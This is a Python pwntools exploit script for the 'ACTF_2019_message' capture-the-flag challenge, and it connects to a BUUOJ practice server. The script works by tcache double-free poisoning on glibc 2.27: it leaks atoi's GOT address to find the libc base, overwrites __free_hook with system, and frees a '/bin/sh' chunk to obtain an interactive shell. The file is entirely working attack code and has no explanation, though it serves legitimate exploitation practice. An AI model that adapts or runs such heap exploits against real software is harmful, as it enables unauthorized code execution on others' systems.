#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/30 18:31:20
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
file_name = "./ACTF_2019_message"
menu = "What's your choice: "
if context.arch == "amd64":
    # libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    # one_offset = [0x4f3d5,0x4f432,0x10a41c]
    libc_path = "../../libc/libc-2.27.so"
    one_offset = [0x4f2c5,0x4f322,0x10a38c]
else:
    libc_path = "~/Desktop/pwn/libc/libc-2.27-32.so"
    # libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
elf = ELF(file_name)
if debug:
    if context.arch == "amd64":
        sh = process([file_name],env={'LD_PRELOAD':libc_path})
        # sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 27683
    sh = remote(IP,port)
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))

def add(size,content):
    cmd(1)
    sh.recvuntil("Please input the length of message:\n")
    sh.sendline(str(size))
    sh.recvuntil("Please input the message:\n")
    sh.send(content)

def dele(idx):
    cmd(2)
    sh.recvuntil("Please input index of message you want to delete:\n")
    sh.sendline(str(idx))

def edit(idx,content):
    cmd(3)
    sh.recvuntil("Please input index of message you want to edit:\n")
    sh.sendline(str(idx))
    sh.recvuntil("Now you can edit the message:\n")
    sh.send(content)

def show(idx):
    cmd(4)
    sh.recvuntil("Please input index of message you want to display:\n")
    sh.sendline(str(idx))
ptr = 0x602060
add(0x20,'a')
add(0x20,'a')
add(0x20,'/bin/sh\x00')
dele(0)
dele(0)
dele(0)
add(0x20,p64(ptr))
add(0x20,'aaa')
add(0x20,p64(8)+p64(elf.got['atoi'])+p64(8)+p64(ptr+8))
show(0)
sh.recvuntil("The message: ")
atoi_addr = u64(sh.recv(6).ljust(8,"\x00"))
libc_base = atoi_addr - libc.symbols['atoi']
log.info("libc_base=>{}".format(hex(libc_base)))
system = libc_base + libc.symbols['system']
free_hook = libc_base +libc.symbols['__free_hook']
edit(1,p64(free_hook))
edit(0,p64(system))
# debug()
dele(2)
sh.interactive()